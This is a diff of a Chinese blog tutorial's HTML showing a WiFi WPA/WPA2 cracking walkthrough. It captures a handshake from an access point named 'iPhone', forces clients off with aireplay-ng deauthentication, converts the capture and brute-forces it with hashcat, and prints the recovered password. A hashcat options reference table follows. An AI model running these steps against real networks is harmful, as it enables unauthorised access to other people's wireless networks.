+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks<span class="comment"># airmon-ng check kill</span></span><br><span class="line"></span><br><span class="line">Killing these processes:</span><br><span class="line"></span><br><span class="line">  PID Name</span><br><span class="line">  891 wpa_supplicant</span><br><span class="line"> 3091 dhclient</span><br><span class="line"> 4430 avahi-daemon</span><br><span class="line"> 4431 avahi-daemon</span><br></pre></td></tr></table></figure></li>
 <li><p>然后将能够抓包的网卡的Mode设为<code>Monitor</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks<span class="comment"># airmon-ng start wlx7cdd90f1f416</span></span><br><span class="line"></span><br><span class="line">Found 2 processes that could cause trouble.</span><br><span class="line">If airodump-ng, aireplay-ng or airtun-ng stops working after</span><br><span class="line">a short period of time, you may want to run <span class="string">'airmon-ng check kill'</span></span><br><span class="line"></span><br><span class="line">  PID Name</span><br><span class="line"> 7674 avahi-daemon</span><br><span class="line"> 7675 avahi-daemon</span><br><span class="line"></span><br><span class="line">PHY	Interface	Driver		Chipset</span><br><span class="line"></span><br><span class="line">phy0	wlp3s0		iwlwifi		Intel Corporation Device 24fb (rev 10)</span><br><span class="line">phy4	wlx7cdd90f1f416	rt2800usb	Ralink Technology, Corp. RT2870/RT3070</span><br><span class="line">truewlx7cdd90f1f416 is soft blocked, please run <span class="string">"rfkill unblock wlx7cdd90f1f416"</span> to use this interface.</span><br><span class="line">rfkill error, unable to start wlx7cdd90f1f416</span><br><span class="line"></span><br><span class="line">Would you like to try and automatically resolve this? [y/n] y</span><br><span class="line">rfkill error: rfkill: invalid identifier: 4</span><br><span class="line">Unable to unblock.</span><br><span class="line">Interface 15mon is too long <span class="keyword">for</span> linux so it will be renamed to the old style (wlan<span class="comment">#) name.</span></span><br><span class="line"></span><br><span class="line">truetrue(mac80211 monitor mode vif enabled on [phy4]wlan0mon</span><br><span class="line">truetrue(mac80211 station mode vif disabled <span class="keyword">for</span> [phy4]wlx7cdd90f1f416)</span><br></pre></td></tr></table></figure>
-</li>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks<span class="comment"># airmon-ng start wlx7cdd90f1f416</span></span><br><span class="line"></span><br><span class="line">Found 2 processes that could cause trouble.</span><br><span class="line">If airodump-ng, aireplay-ng or airtun-ng stops working after</span><br><span class="line">a short period of time, you may want to run <span class="string">'airmon-ng check kill'</span></span><br><span class="line"></span><br><span class="line">  PID Name</span><br><span class="line"> 7674 avahi-daemon</span><br><span class="line"> 7675 avahi-daemon</span><br><span class="line"></span><br><span class="line">PHY	Interface	Driver		Chipset</span><br><span class="line"></span><br><span class="line">phy0	wlp3s0		iwlwifi		Intel Corporation Device 24fb (rev 10)</span><br><span class="line">phy4	wlx7cdd90f1f416	rt2800usb	Ralink Technology, Corp. RT2870/RT3070</span><br><span class="line">truewlx7cdd90f1f416 is soft blocked, please run <span class="string">"rfkill unblock wlx7cdd90f1f416"</span> to use this interface.</span><br><span class="line">rfkill error, unable to start wlx7cdd90f1f416</span><br><span class="line"></span><br><span class="line">Would you like to try and automatically resolve this? [y/n] y</span><br><span class="line">rfkill error: rfkill: invalid identifier: 4</span><br><span class="line">Unable to unblock.</span><br><span class="line">Interface 15mon is too long <span class="keyword">for</span> linux so it will be renamed to the old style (wlan<span class="comment">#) name.</span></span><br><span class="line"></span><br><span class="line">truetrue(mac80211 monitor mode vif enabled on [phy4]wlan0mon</span><br><span class="line">truetrue(mac80211 station mode vif disabled <span class="keyword">for</span> [phy4]wlx7cdd90f1f416)</span><br></pre></td></tr></table></figure></li>
 <li><p>此时再看一下无线网卡状态:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks<span class="comment"># iwconfig</span></span><br><span class="line">lo        no wireless extensions.</span><br><span class="line"></span><br><span class="line">wlp3s0    IEEE 802.11  ESSID:off/any  </span><br><span class="line">          Mode:Managed  Access Point: Not-Associated   Tx-Power=0 dBm   </span><br><span class="line">          Retry short <span class="built_in">limit</span>:7   RTS thr:off   Fragment thr:off</span><br><span class="line">          Encryption key:off</span><br><span class="line">          Power Management:on</span><br><span class="line">          </span><br><span class="line">wlan0mon  IEEE 802.11  Mode:Monitor  Tx-Power=off   </span><br><span class="line">          Retry short  long <span class="built_in">limit</span>:2   RTS thr:off   Fragment thr:off</span><br><span class="line">          Power Management:off</span><br><span class="line">          </span><br><span class="line">enp2s0    no wireless extensions.</span><br><span class="line"></span><br><span class="line">enp0s20f0u1  no wireless extensions.</span><br></pre></td></tr></table></figure>
-
-<p>已更改~</p>
-</li>
+<p>已更改~</p></li>
 </ol>
-<h3 id="0x12-实施攻击"><a href="#0x12-实施攻击" class="headerlink" title="0x12 实施攻击"></a>0x12 实施攻击</h3><ol>
+<h3 id="x12-实施攻击">0x12 实施攻击</h3>
+<ol type="1">
 <li><p>我们的攻击目标是<code>iPhone</code>:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks<span class="comment"># airodump-ng wlan0mon</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/1540284494095.png" alt="img"></p>
-<p>上图可看到它的mac是<code>74:D2:1D:AE:3F:94</code>, 信道(CH)是<code>1</code>. (记住这两个信息下面有用)</p>
-</li>
+<figure>
+<img src="/2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/1540284494095.png" alt="img"><figcaption>img</figcaption>
+</figure>
+<p>上图可看到它的mac是<code>74:D2:1D:AE:3F:94</code>, 信道(CH)是<code>1</code>. (记住这两个信息下面有用)</p></li>
 <li><p>接下来我们开两个shell, 一个shell负责监听握手包, 另一个shell负责洪荒攻击两个正常连接的WiFi设备, 我们先看看第一个shell:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng --bssid 74:D2:1D:AE:3F:94 -c 1 -w <span class="built_in">test</span> wlan0mon</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/1540286260611.png" alt="img"></p>
+<figure>
+<img src="/2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/1540286260611.png" alt="img"><figcaption>img</figcaption>
+</figure>
 <p>可以看出来已经抓到了握手包703个. 对命令参数解释如下:</p>
 <blockquote>
-<p>–bssid: 表示WiFi热点的mac</p>
+<p>--bssid: 表示WiFi热点的mac</p>
 <p>-c: 表示信道1</p>
 <p>-w: 后面跟着文件名</p>
 <p>wlan0mon: 需要监听的网卡</p>
-</blockquote>
-</li>
+</blockquote></li>
 <li><p>开启了监听之后, 我们就需要DDoS目标连接了, 这时候在另一个shell输入如下命令:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng --deauth 5 -a 74:D2:1D:AE:3F:94 wlan0mon</span><br></pre></td></tr></table></figure>
-
-<p>隔几秒发一次, 以抓到足够的握手包, 减少爆破的时间.</p>
-</li>
+<p>隔几秒发一次, 以抓到足够的握手包, 减少爆破的时间.</p></li>
 </ol>
-<h2 id="0x20-开始爆破"><a href="#0x20-开始爆破" class="headerlink" title="0x20 开始爆破"></a>0x20 开始爆破</h2><p>在上面操作的监听过程中, 会在当前路径下保存一个抓到的握手包的数据, 但这个流量包还不能直接让hashcat跑, 需要做简单的处理, 先做一个简单的数据清洗:</p>
+<h2 id="x20-开始爆破">0x20 开始爆破</h2>
+<p>在上面操作的监听过程中, 会在当前路径下保存一个抓到的握手包的数据, 但这个流量包还不能直接让hashcat跑, 需要做简单的处理, 先做一个简单的数据清洗:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ks:~/crack_packet_wifi<span class="comment"># wpaclean wpapass.cap test-05.cap </span></span><br><span class="line">Pwning <span class="built_in">test</span>-05.cap (1/1 100%)</span><br><span class="line">Net 74:d2:1d:ae:3f:94 iPhone</span><br><span class="line">Done</span><br></pre></td></tr></table></figure>
-
 <p>可以看到, 已经成功识别出目标无限的mac. 接下来我们吧数据包转换成hashcat能够识别的hash类型:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks/software/crack_pw/crack_packet_wifi<span class="comment"># aircrack-ng wpapass.cap -J wpahash</span></span><br><span class="line">Opening wpapass.cap</span><br><span class="line">Read 3 packets.</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  BSSID              ESSID                     Encryption</span></span><br><span class="line"></span><br><span class="line">   1  74:D2:1D:AE:3F:94  iPhone                    WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line">Opening wpapass.cap</span><br><span class="line">Reading packets, please <span class="built_in">wait</span>...</span><br><span class="line">Building Hashcat (1.00) file...</span><br><span class="line">[*] ESSID (length: 6): iPhone</span><br><span class="line">[*] Key version: 2</span><br><span class="line">[*] BSSID: 74:D2:1D:AE:3F:94</span><br><span class="line">[*] STA: 88:C9:D0:B7:2C:36</span><br><span class="line">[*] anonce:</span><br><span class="line">    E6 A3 D9 3C 95 77 3E 0B 5D 84 CE 65 0D 1C EB 59 </span><br><span class="line">    E4 E4 E3 A5 3A 07 FE D8 47 A1 7C 77 10 66 DC E4 </span><br><span class="line">[*] snonce:</span><br><span class="line">    03 8D 9F 6B A8 4B 27 7D 8E 02 57 56 34 D9 98 2A </span><br><span class="line">    4D 36 1C EA 2D 6A 91 43 4F 30 67 96 81 14 F4 AD </span><br><span class="line">[*] Key MIC:</span><br><span class="line">    21 51 2B 3C 6F 37 CA 9E 09 6C 92 74 45 DC DA 11</span><br><span class="line">[*] eapol:</span><br><span class="line">    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 </span><br><span class="line">    03 03 8D 9F 6B A8 4B 27 7D 8E 02 57 56 34 D9 98 </span><br><span class="line">    2A 4D 36 1C EA 2D 6A 91 43 4F 30 67 96 81 14 F4 </span><br><span class="line">    AD 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC </span><br><span class="line">    04 01 00 00 0F AC 02 80 00 </span><br><span class="line">Successfully written to wpahash.hccap</span><br><span class="line">Quitting aircrack-ng...</span><br></pre></td></tr></table></figure>
-
 <p>接下来就是直接放到爆破的服务器上跑(实测用最新版的hashcat跑不了, 这里用了3.30版本的hashcat)</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hashcat64.bin -m 2500 -a 3 wpahash.hccap ?d?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
-
 <p>几秒钟就跑出来了:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Running</span><br><span class="line">Hash.Type........: WPA/WPA2</span><br><span class="line">Hash.Target......: iPhone (74:d2:1d:ae:3f:94 &lt;-&gt; 88:c9:d0:b7:2c:36)</span><br><span class="line">Time.Started.....: Tue Oct 23 17:43:18 2018 (3 secs)</span><br><span class="line">Time.Estimated...: Tue Oct 23 17:44:52 2018 (1 min, 31 secs)</span><br><span class="line">Input.Mask.......: ?d?d?d?d?d?d?d?d [8]</span><br><span class="line">Input.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.Dev.<span class="comment">#2.....:   535.2 kH/s (6.23ms)</span></span><br><span class="line">Speed.Dev.<span class="comment">#3.....:   527.7 kH/s (6.34ms)</span></span><br><span class="line">Speed.Dev.<span class="comment">#*.....:  1062.9 kH/s</span></span><br><span class="line">Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts</span><br><span class="line">Progress.........: 2207744/100000000 (2.21%)</span><br><span class="line">Rejected.........: 0/2207744 (0.00%)</span><br><span class="line">Restore.Point....: 0/10000000 (0.00%)</span><br><span class="line">Candidates.<span class="comment">#2....: 42345678 -&gt; 41875555</span></span><br><span class="line">Candidates.<span class="comment">#3....: 40689823 -&gt; 49471088</span></span><br><span class="line">HWMon.Dev.<span class="comment">#2.....: Temp: 41c Fan: 29% Util: 97% Core:1860Mhz Mem:5005Mhz Lanes:16</span></span><br><span class="line">HWMon.Dev.<span class="comment">#3.....: Temp: 41c Fan:  0% Util: 97% Core:1809Mhz Mem:5005Mhz Lanes:16</span></span><br><span class="line"></span><br><span class="line">iPhone:74d21dae3f94:88c9d0b72c36:67854312</span><br></pre></td></tr></table></figure>
-
 <p>假设我们把它设置成全字符爆破, 也就是:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hashcat64.bin -m 2500 -a 3 wpahash.hccap ?a?a?a?a?a?a?a?a</span><br></pre></td></tr></table></figure>
-
 <p>则需要几百年(可见, 如果知道WiFi密码的字符组成结构, 也就成功了一半了):</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Running</span><br><span class="line">Hash.Type........: WPA/WPA2</span><br><span class="line">Hash.Target......: iPhone (74:d2:1d:ae:3f:94 &lt;-&gt; 88:c9:d0:b7:2c:36)</span><br><span class="line">Time.Started.....: Tue Oct 23 17:53:33 2018 (31 secs)</span><br><span class="line">Time.Estimated...: Fri Dec 24 03:40:44 2021 (200 years, 198 days)</span><br><span class="line">Input.Mask.......: ?a?a?a?a?a?a?a?a [8]</span><br><span class="line">Input.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.Dev.<span class="comment">#2.....:   531.0 kH/s (6.38ms)</span></span><br><span class="line">Speed.Dev.<span class="comment">#3.....:   517.3 kH/s (6.52ms)</span></span><br><span class="line">Speed.Dev.<span class="comment">#*.....:  1048.3 kH/s</span></span><br><span class="line">Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts</span><br><span class="line">Progress.........: 31854592/6634204312890625 (0.00%)</span><br><span class="line">Rejected.........: 0/31854592 (0.00%)</span><br><span class="line">Restore.Point....: 0/69833729609375 (0.00%)</span><br><span class="line">Candidates.<span class="comment">#2....: E]_LINAN -&gt; E;$.1988</span></span><br><span class="line">Candidates.<span class="comment">#3....: Narinane -&gt; N"XZANAN</span></span><br><span class="line">HWMon.Dev.<span class="comment">#2.....: Temp: 66c Fan: 47% Util: 97% Core:1809Mhz Mem:5005Mhz Lanes:16</span></span><br><span class="line">HWMon.Dev.<span class="comment">#3.....: Temp: 65c Fan: 34% Util: 97% Core:1759Mhz Mem:5005Mhz Lanes:16</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
+<h2 id="参考链接">参考链接</h2>
+<ol type="1">
 <li><a href="https://www.shellntel.com/blog/2017/2/8/how-to-build-a-8-gpu-password-cracker" target="_blank" rel="noopener">How to build a 8 GPU password cracker</a></li>
 <li><a href="https://www.blackhillsinfosec.com/running-hashcat-on-ubuntu-18-04-server-with-1080ti/" target="_blank" rel="noopener">Running HashCat on Ubuntu 18.04 Server with 1080TI</a></li>
 <li><a href="https://www.blackhillsinfosec.com/build-password-cracker-nvidia-gtx-1080ti-gtx-1070/" target="_blank" rel="noopener">How to Build a Password Cracker with NVidia GTX 1080TI &amp; GTX 1070</a></li>
-<li><a href="https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/" target="_blank" rel="noopener">快速破解各种散列hash hashcat入门篇 </a></li>
+<li><a href="https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/" target="_blank" rel="noopener">快速破解各种散列hash hashcat入门篇</a></li>
 <li><a href="https://klionsec.github.io/2015/04/14/aircrack-hascat/" target="_blank" rel="noopener">aircrack &amp; hashcat 非字典高速破解目标无线密码</a></li>
 <li><a href="https://bbs.ichunqiu.com/thread-21342-1-1.html" target="_blank" rel="noopener">用hashcat超速破解WiFi密码</a></li>
 <li><a href="http://www.arkteam.net/?p=3737" target="_blank" rel="noopener">开源GPU密码破解工具–HashCat</a></li>
 <li><a href="https://www.jianshu.com/p/156e47e71b67" target="_blank" rel="noopener">hashcat 帮助文件 中文翻译</a></li>
 <li><a href="http://www.freebuf.com/column/175400.html" target="_blank" rel="noopener">Hashcat用户手册——直接攻击模式的使用</a></li>
 </ol>
-<h2 id="附录一"><a href="#附录一" class="headerlink" title="附录一"></a>附录一</h2><h3 id="①-hashcat选项解释"><a href="#①-hashcat选项解释" class="headerlink" title="① hashcat选项解释"></a>① hashcat选项解释</h3><p>用法: </p>
+<h2 id="附录一">附录一</h2>
+<h3 id="hashcat选项解释">① hashcat选项解释</h3>
+<p>用法:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat [选项]... <span class="built_in">hash</span>|<span class="built_in">hash</span>文件|hccapx文件 [字典|掩码|目录]...</span><br></pre></td></tr></table></figure>
-
-<table>
+<table style="width:100%;">
+<colgroup>
+<col style="width: 24%">
+<col style="width: 7%">
+<col style="width: 39%">
+<col style="width: 28%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>选项 缩写 / 原文</th>
 <th>参数类型</th>
 <th>描述</th>
 <th>用例</th>
 </tr>
 </thead>
-<tbody><tr>
-<td>-m,–hash-type</td>
+<tbody>
+<tr class="odd">
+<td>-m,--hash-type</td>
 <td>数字</td>
 <td>Hash种类，参见下面的参考</td>
 <td>-m 1000</td>
 </tr>
-<tr>
-<td>-a,–attack-mode</td>
+<tr class="even">
+<td>-a,--attack-mode</td>
 <td>数字</td>
 <td>攻击模式，参见下面的参考</td>
 <td>-a 3</td>
 </tr>
-<tr>
-<td>-V,–version</td>
+<tr class="odd">
+<td>-V,--version</td>
 <td></td>
 <td>输出版本信息</td>
 <td></td>
 </tr>
-<tr>
-<td>-h,–help</td>
+<tr class="even">
+<td>-h,--help</td>
 <td></td>
 <td>输出帮助信息</td>
 <td></td>
 </tr>
-<tr>
-<td>–quiet</td>
+<tr class="odd">
+<td>--quiet</td>
 <td></td>
 <td>禁用输出</td>
 <td></td>
 </tr>
-<tr>
-<td>–hex-charset</td>
+<tr class="even">
+<td>--hex-charset</td>
 <td></td>
 <td>字符集以十六进制形式给出</td>
 <td></td>
 </tr>
-<tr>
-<td>–hex-salt</td>
+<tr class="odd">
+<td>--hex-salt</td>
 <td></td>
 <td>盐以十六进制形式给出</td>
 <td></td>
 </tr>
-<tr>
-<td>–hex-wordlist</td>
+<tr class="even">
+<td>--hex-wordlist</td>
 <td></td>
 <td>字典中的单词是以十六进制形式给出的</td>
 <td></td>
 </tr>
-<tr>
-<td>–force</td>
+<tr class="odd">
+<td>--force</td>
 <td></td>
 <td>忽略警告</td>
 <td></td>
 </tr>
-<tr>
-<td>–status</td>
+<tr class="even">
+<td>--status</td>
 <td></td>
 <td>自动更新屏幕</td>
 <td></td>
 </tr>
-<tr>
-<td>–status-timer</td>
+<tr class="odd">
+<td>--status-timer</td>
 <td>数字</td>
 <td>设置自动更新屏幕间隔为X秒</td>
-<td>–status-timer=1</td>
+<td>--status-timer=1</td>
 </tr>
-<tr>
-<td>–machine-readable</td>
+<tr class="even">
+<td>--machine-readable</td>
 <td></td>
 <td>以机器可读格式显示状态视图</td>
 <td></td>
 </tr>
-<tr>
-<td>–keep-guessing</td>
+<tr class="odd">
+<td>--keep-guessing</td>
 <td></td>
 <td>被破解之后继续猜测Hash</td>
 <td></td>
 </tr>
-<tr>
-<td>–loopback</td>
+<tr class="even">
+<td>--loopback</td>
 <td></td>
 <td>在induction目录中加入新的纯文本文件</td>
 <td></td>
 </tr>
-<tr>
-<td>–weak-hash-threshold</td>
+<tr class="odd">
+<td>--weak-hash-threshold</td>
 <td>数字</td>
 <td>当阈值为X时停止检查弱Hash</td>
-<td>–weak=0</td>
+<td>--weak=0</td>
 </tr>
-<tr>
-<td>–markov-hcstat</td>
+<tr class="even">
+<td>--markov-hcstat</td>
 <td>文件</td>
 <td>指定要使用的hcstat文件</td>
-<td>–markov-hc=my.hcstat</td>
+<td>--markov-hc=my.hcstat</td>
 </tr>
-<tr>
-<td>–markov-disable</td>
+<tr class="odd">
+<td>--markov-disable</td>
 <td></td>
 <td>禁用马尔可夫链，模仿经典暴力破解</td>
 <td></td>
 </tr>
-<tr>
-<td>–markov-classic</td>
+<tr class="even">
+<td>--markov-classic</td>
 <td></td>
 <td>启用经典马尔可夫链，无任何位置</td>
 <td></td>
 </tr>
-<tr>
-<td>-t,–markov-threshold</td>
+<tr class="odd">
+<td>-t,--markov-threshold</td>
 <td>数字</td>
 <td>当阈值X时停止接收新的马尔科夫链</td>
 <td>-t 50</td>
 </tr>
-<tr>
-<td>–runtime</td>
+<tr class="even">
+<td>--runtime</td>
 <td>数字</td>
 <td>运行X秒后中止会话</td>
-<td>–runtime=10</td>
+<td>--runtime=10</td>
 </tr>
-<tr>
-<td>–session</td>
+<tr class="odd">
+<td>--session</td>
 <td>字符串</td>
 <td>定义具体的会话名称</td>
-<td>–session=mysession</td>
+<td>--session=mysession</td>
 </tr>
-<tr>
-<td>–restore</td>
+<tr class="even">
+<td>--restore</td>
 <td></td>
-<td>从–session恢复会话</td>
+<td>从--session恢复会话</td>
 <td></td>
 </tr>
-<tr>
-<td>–restore-disable</td>
+<tr class="odd">
+<td>--restore-disable</td>
 <td></td>
 <td>不写入恢复文件</td>
 <td></td>
 </tr>
-<tr>
-<td>–restore-file-path</td>
+<tr class="even">
+<td>--restore-file-path</td>
 <td>文件</td>
 <td>指定恢复文件的路径</td>
-<td>–restore-file-path=my.restore</td>
+<td>--restore-file-path=my.restore</td>
 </tr>
-<tr>
-<td>-o,–outfile</td>
+<tr class="odd">
+<td>-o,--outfile</td>
 <td>文件</td>
 <td>定义恢复的Hash的输出文件</td>
 <td>-o outfile.txt</td>
 </tr>
-<tr>
-<td>–outfile-format</td>
+<tr class="even">
+<td>--outfile-format</td>
 <td>数字</td>
 <td>定义恢复的Hash的输出格式，参见下面的参考</td>
-<td>–outfile-format=7</td>
+<td>--outfile-format=7</td>
 </tr>
-<tr>
-<td>–outfile-autohex-disable</td>
+<tr class="odd">
+<td>--outfile-autohex-disable</td>
 <td></td>
 <td>在输出纯文本文件中禁用$HEX[]</td>
 <td></td>
 </tr>
-<tr>
-<td>–outfile-check-timer</td>
+<tr class="even">
+<td>--outfile-check-timer</td>
 <td>数字</td>
 <td>设置输出文件检查间隔为X秒</td>
-<td>–outfile-check=30</td>
+<td>--outfile-check=30</td>
 </tr>
-<tr>
-<td>-p,–separator</td>
+<tr class="odd">
+<td>-p,--separator</td>
 <td>字符</td>
 <td>Hash表和输出文件的分隔符</td>
 <td>-p :</td>
 </tr>
-<tr>
-<td>–stdout</td>
+<tr class="even">
+<td>--stdout</td>
 <td></td>
 <td>不破解Hash，只打印候选值</td>
 <td></td>
 </tr>
-<tr>
-<td>–show</td>
+<tr class="odd">
+<td>--show</td>
 <td></td>
 <td>比较Hash表和pot文件，显示已破解的Hash</td>
 <td></td>
 </tr>
-<tr>
-<td>–left</td>
+<tr class="even">
+<td>--left</td>
 <td></td>
 <td>比较Hash表和pot文件，显示未破解的Hash</td>
 <td></td>
 </tr>
-<tr>
-<td>–username</td>
+<tr class="odd">
+<td>--username</td>
 <td></td>
 <td>忽略Hash文件中的用户名</td>
 <td></td>
 </tr>
-<tr>
-<td>–remove</td>
+<tr class="even">
+<td>--remove</td>
 <td></td>
 <td>一旦破解，就删除Hash</td>
 <td></td>
 </tr>
-<tr>
-<td>–remove-timer</td>
+<tr class="odd">
+<td>--remove-timer</td>
 <td>数字</td>
 <td>每X秒更新输入的Hash文件</td>
-<td>–remove-timer=30</td>
+<td>--remove-timer=30</td>
 </tr>
-<tr>
-<td>–potfile-disable</td>
+<tr class="even">
+<td>--potfile-disable</td>
 <td></td>
 <td>不写入pot文件</td>
 <td></td>
 </tr>
-<tr>
-<td>–potfile-path</td>
+<tr class="odd">
+<td>--potfile-path</td>
 <td>目录</td>
 <td>指定pot文件的路径</td>
-<td>–potfile-path=my.pot</td>
+<td>--potfile-path=my.pot</td>
 </tr>
-<tr>
-<td>–debug-mode</td>
+<tr class="even">
+<td>--debug-mode</td>
 <td>数字</td>
 <td>定义调试模式(仅通过使用规则进行混合)</td>
-<td>–debug-mode=4</td>
+<td>--debug-mode=4</td>
 </tr>
-<tr>
-<td>–debug-file</td>
+<tr class="odd">
+<td>--debug-file</td>
 <td>文件</td>
 <td>调试规则的输出文件</td>
-<td>–debug-file=good.log</td>
+<td>--debug-file=good.log</td>
 </tr>
-<tr>
-<td>–induction-dir</td>
+<tr class="even">
+<td>--induction-dir</td>
 <td>目录</td>
 <td>指定loopback的induction目录</td>
-<td>–induction=inducts</td>
+<td>--induction=inducts</td>
 </tr>
-<tr>
-<td>–outfile-check-dir</td>
+<tr class="odd">
+<td>--outfile-check-dir</td>
 <td>目录</td>
 <td>指定监控纯文本文件的输出目录</td>
-<td>–outfile-check-dir=x</td>
+<td>--outfile-check-dir=x</td>
 </tr>
-<tr>
-<td>–logfile-disable</td>
+<tr class="even">
+<td>--logfile-disable</td>
 <td></td>
 <td>禁用日志文件</td>
 <td></td>
 </tr>
-<tr>
-<td>–hccapx-message-pair</td>
+<tr class="odd">
+<td>--hccapx-message-pair</td>
 <td>数字</td>
 <td>只从hccapx加载匹配X的消息对</td>
-<td>–hccapx-message-pair=2</td>
+<td>--hccapx-message-pair=2</td>
 </tr>
-<tr>
-<td>–nonce-error-corrections</td>
+<tr class="even">
+<td>--nonce-error-corrections</td>
 <td>数字</td>
 <td>用BF大小范围来取代AP最后字节的随机数</td>
-<td>–nonce-error-corrections=16</td>
+<td>--nonce-error-corrections=16</td>
 </tr>
-<tr>
-<td>–truecrypt-keyfiles</td>
+<tr class="odd">
+<td>--truecrypt-keyfiles</td>
 <td>文件</td>
